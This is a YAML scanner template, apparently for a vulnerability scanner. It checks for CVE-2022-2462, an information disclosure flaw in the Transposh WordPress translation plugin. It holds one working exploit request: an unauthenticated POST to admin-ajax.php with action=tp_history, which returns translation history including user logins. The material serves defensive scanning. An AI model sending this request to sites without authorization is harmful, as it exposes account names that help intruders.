name: yaml-poc-transposh-transposh_wordpress_translation-leak-CVE-2022-2462
binding: b298b91c-067e-4110-8904-2bdfd9fcb850
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-2462/
        - https://packetstormsecurity.com/files/167878/Transposh-WordPress-Translation-1.0.8.1-Information-Disclosure.html
        - https://packetstormsecurity.com/files/167878/wptransposh1081-disclose.txt
        - https://plugins.trac.wordpress.org/browser/transposh-translation-filter-for-wordpress/trunk/transposh.php?rev=2682425#L1948
        - https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/
        - https://www.wordfence.com/vulnerability-advisories/#CVE-2022-2462
    vulnerability:
        id: 0b686a27-2f28-493b-8b8c-4c7652ae3c11
        level: medium
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=tp_history&token=&lang=en
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("translated") && response.body_string.contains("translated_by") && response.body_string.contains("timestamp") && response.body_string.contains("source") && response.body_string.contains("user_login") && "Transposh" in response.headers
expression: r0()
